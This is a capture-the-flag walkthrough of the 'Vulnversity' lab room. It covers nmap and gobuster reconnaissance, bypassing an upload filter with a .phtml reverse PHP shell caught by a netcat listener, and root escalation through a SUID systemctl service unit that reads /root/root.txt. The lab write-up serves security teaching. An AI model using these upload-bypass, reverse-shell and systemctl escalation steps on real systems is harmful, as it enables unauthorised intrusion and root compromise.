## Vulnversity
This room is based on basic learning related to reconnaissance, web app attacks and simple privilege escalation.

#### [Task 1] Deployment
The first and most important task is to deploy the machine on which we can perform the attacks and complete all the subsequent tasks.
Once deployed, we are provided with the machine title, it's IP address and the time expiry time which can be extended as well.

#### [Task 2] Reconnaissance
As the name suggests this task is related to recon and the best tools for that is none other than [nmap](https://nmap.org/) which is practiced in this task. A few nmap flags and their description are already provided but other than that `man nmap` is always there for your help.

I read all the tasks and ran only a single command as it takes a lot of time to perform the nmap scan and running different commands for each and every question would consume a large amount of time. The command that can be used is:
`nmap -A -sV -p- -T4 <machine IP>`


| Flag | Description |
|------|-----------------------------------------------------------------------|
| -A | Performs OS and version detections, also check various in-built scripts |
| -sV | Performs service version detection |
| -p- | Checks all the open ports |
| -T4 | Running speed at level 4 with 1 slowest and 5 fastest |


Scan Result:
```
tester@kali:~$ nmap -A -sV -T4 10.10.156.186
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-13 10:32 IST
Nmap scan report for 10.10.156.186
Host is up (0.16s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h19m59s, deviation: 2h18m34s, median: -1s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2020-07-13T01:03:13-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-07-13T05:03:14
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.47 seconds
```

From the scan results, we get the following answers:
1. 6 ports are open
2. Squid version 3.5.12 is running
3. Ubuntu
4. The web server is running on port 3333

Answers to some other questions are:
1. `-p-400` will check the first 400 ports
2. The flag `-n` will not perform DNS resolution

#### [Task 3] GoBuster
This task is all about learning basics related to [GoBuster](https://github.com/OJ/gobuster) which is a directory discovery tool. In case, if we don't have the tool on our attacking machine, in the task itself installation is explained. 
Moving forward, we run the GoBuster to check all the directories.

We run the following command to get a list of all the directories:
`gobuster dir -u http://<machine IP>:3333 -w <wordlist path>`


| Flag | Description |
|------|------------------------------------------------|
| -u | To determine the URL that is to be enumerated |
| -w | To specify the path where our wordlist is stored |


We are running the command on port 3333 as from nmap results we observed that the web server was running on that port itself. Otherwise, in a real-world scenario, we would usually go for ports 80 and 443.

GoBuster Result:
```
tester@kali:~$ gobuster dir -u http://10.10.156.186:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.156.186:3333
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/07/13 11:12:18 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/internal (Status: 301)
```

From the results, we can see that the form can be uploaded at: `./internal`.

#### [Task 4] Compromising Web Server
Now that we know a point from where we can enter into the target machine, we start testing various files that can be uploaded to the server. We can try files like .txt, .html, .md and other but the one that gets blocked is .php.

The next task is to create a list of files with various extensions that are mentioned and use it with [Burp](https://portswigger.net/burp/communitydownload) Intruder. After running the attack as described in the task, one extension is found to be allowed and that is .phtml.

As per the instructions on the task, we need to download the reverse PHP shell and perform the following task.
1. Rename the file (payload.phtml) and make changes related to IP and port
2. Start listening using [netcat](https://nmap.org/ncat/) command: `nc -nvlp 1234`
3. Upload the shell payload at `/internal`
4. Visit: `http://<machine IP>:3333/internal/uploads/payload.phtml`

Once we open the link, a netcat session starts on our listener with shell access to the machine. To check the user who manages the web server, we can go to /home directory and find the user there. The flag is present in the directory of that user itself in a file named `user.txt`.

### [Task 5] Privilege Escalation
As we were able to access the user's folder, this means that we are currently having user-level access but not root level. And to gain root-level access we need to perform privilege escalation. After some googling, we can find over the internet that the permissions value for SUID files is 4000 and we can run a search accordingly:
`find / -perm /4000 2> /dev/null`

| Flag | Description |
|--------------|---------------------------------------------------------------------------|
| / | The path for the directory that is to be searched |
| -perm | Find files related the specified permission value |
| 2> /dev/null | Helps to omit the files we don't have access to from the resulting output |

The output containes many files which are given below:
```
$ find / -perm /4000 2> /dev/null
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/newgidmap
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/squid/pinger
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/bin/su
/bin/ntfs-3g
/bin/mount
/bin/ping6
/bin/umount
/bin/systemctl
/bin/ping
/bin/fusermount
/sbin/mount.cifs
```

The one file that stands out is /bin/systemctl. Now the next task is totally upon us. To solve this question and get the root flag there is only one source for our help and that is Google. After searching for `systemctl privilege escalation`, we can find results related to [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/).

Using GTFOBins for systemctl, exploitation can be performed as:

```
tester@kali:~$ nc -nvlp 1234
listening on [any] 1234 ...
connect to [10.8.48.20] from (UNKNOWN) [10.10.222.75] 48674
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 03:38:12 up 3 min,  0 users,  load average: 0.71, 1.13, 0.52
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ TF=$(mktemp).service
$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "/root/root.txt > /tmp/output"
> [Install]
> WantedBy=multi-user.target' > $TF
$ sudo systemctl link $TF
sudo: no tty present and no askpass program specified
$ TF=$(mktemp).service
$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "/root/root.txt > /tmp/output"
> [Install]
> WantedBy=multi-user.target' > $TF
$ ./systemctl link $TF
/bin/sh: 14: ./systemctl: not found
$ TF=$(mktemp).service
$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
> [Install]
> 
WantedBy=multi-user.target' > $TF> 
$ /bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.LQV4ISuo3H.service to /tmp/tmp.LQV4ISuo3H.service.
$ /bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.LQV4ISuo3H.service to /tmp/tmp.LQV4ISuo3H.service.
$ cat /tmp/output
```
We need to make some changes to the commands provided in the GTFOBins which are given below:
1. Replace `id` with `cat /root/root.txt` 
2. Executing `/bin/systemctl` instead of `./systemctl` as we are not in `/bin`.

And that is how we get the root flag and solve the room. 


